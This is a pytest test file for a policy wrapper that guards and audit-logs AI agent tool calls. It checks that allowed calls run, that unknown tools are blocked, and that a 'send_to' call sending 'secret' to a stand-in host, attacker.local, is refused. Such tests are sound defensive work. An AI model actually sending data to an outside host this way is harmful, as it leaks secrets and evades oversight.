"""Tests for guarded tool wrapper."""

import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from guarded.wrapper import guarded_tool, PolicyBlocked
from policy.monitor import check


def test_guarded_tool_allowed():
    """Test that allowed tool calls execute successfully."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        data_root = Path(tmpdir) / "data"
        data_root.mkdir()
        
        # Create a test file
        test_file = data_root / "secret.txt"
        test_file.write_text("SECRET_TOKEN=DEADBEEF")
        
        # Mock tool function
        def mock_read_file(path: str) -> str:
            return f"Content of {path}"
        
        # Wrap the tool
        wrapped_tool = guarded_tool(
            mock_read_file,
            tool_name="read_file",
            log_path=log_path,
            data_root=data_root,
            policy_check=check
        )
        
        # Call with allowed path
        result = wrapped_tool(path="secret.txt")
        assert result == "Content of secret.txt"
        
        # Check audit log was created
        assert log_path.exists()
        with open(log_path, "r") as f:
            lines = f.readlines()
            assert len(lines) == 1
            assert '"decision":"ALLOW"' in lines[0]


def test_guarded_tool_blocked():
    """Test that blocked tool calls raise PolicyBlocked."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        data_root = Path(tmpdir) / "data"
        data_root.mkdir()
        
        # Mock tool function that should not be called
        call_count = 0
        def mock_send_to(url: str, content: str) -> None:
            nonlocal call_count
            call_count += 1
        
        # Wrap the tool
        wrapped_tool = guarded_tool(
            mock_send_to,
            tool_name="send_to",
            log_path=log_path,
            data_root=data_root,
            policy_check=check
        )
        
        # Call with blocked URL
        with pytest.raises(PolicyBlocked) as exc_info:
            wrapped_tool(url="http://attacker.local/ingest", content="secret")
        
        assert "Only localhost allowed" in str(exc_info.value)
        
        # Ensure underlying function was not called
        assert call_count == 0
        
        # Check audit log was created
        assert log_path.exists()
        with open(log_path, "r") as f:
            lines = f.readlines()
            assert len(lines) == 1
            assert '"decision":"BLOCK"' in lines[0]


def test_guarded_tool_audit_logging():
    """Test that audit entries are properly logged."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        data_root = Path(tmpdir) / "data"
        data_root.mkdir()
        
        # Mock tool function
        def mock_summarize(text: str) -> str:
            return f"Summary: {text[:10]}"
        
        # Wrap the tool
        wrapped_tool = guarded_tool(
            mock_summarize,
            tool_name="summarize",
            log_path=log_path,
            data_root=data_root,
            policy_check=check
        )
        
        # Call the tool
        result = wrapped_tool(text="This is a long text to summarize")
        assert result == "Summary: This is a "
        
        # Check audit log content
        assert log_path.exists()
        with open(log_path, "r") as f:
            content = f.read()
            assert '"tool":"summarize"' in content
            assert '"args_hash":' in content  # Check that args_hash is present
            assert '"decision":"ALLOW"' in content
            assert '"reason":"Summarize operation allowed"' in content


def test_guarded_tool_multiple_calls():
    """Test that multiple calls create multiple audit entries."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        data_root = Path(tmpdir) / "data"
        data_root.mkdir()
        
        # Mock tool function
        def mock_summarize(text: str) -> str:
            return f"Summary: {text[:5]}"
        
        # Wrap the tool
        wrapped_tool = guarded_tool(
            mock_summarize,
            tool_name="summarize",
            log_path=log_path,
            data_root=data_root,
            policy_check=check
        )
        
        # Make multiple calls
        wrapped_tool(text="First call")
        wrapped_tool(text="Second call")
        wrapped_tool(text="Third call")
        
        # Check audit log has multiple entries
        assert log_path.exists()
        with open(log_path, "r") as f:
            lines = f.readlines()
            assert len(lines) == 3
            
            # Each line should be valid JSON with ALLOW decision
            for line in lines:
                assert '"decision":"ALLOW"' in line
                assert '"tool":"summarize"' in line


def test_guarded_tool_unknown_tool():
    """Test that unknown tools are blocked."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        data_root = Path(tmpdir) / "data"
        data_root.mkdir()
        
        # Mock tool function
        def mock_evil_tool(payload: str) -> str:
            return "Evil executed"
        
        # Wrap the tool
        wrapped_tool = guarded_tool(
            mock_evil_tool,
            tool_name="evil_tool",
            log_path=log_path,
            data_root=data_root,
            policy_check=check
        )
        
        # Call should be blocked
        with pytest.raises(PolicyBlocked) as exc_info:
            wrapped_tool(payload="malicious")
        
        assert "not in allowlist" in str(exc_info.value)
        
        # Check audit log
        assert log_path.exists()
        with open(log_path, "r") as f:
            content = f.read()
            assert '"decision":"BLOCK"' in content
            assert '"tool":"evil_tool"' in content
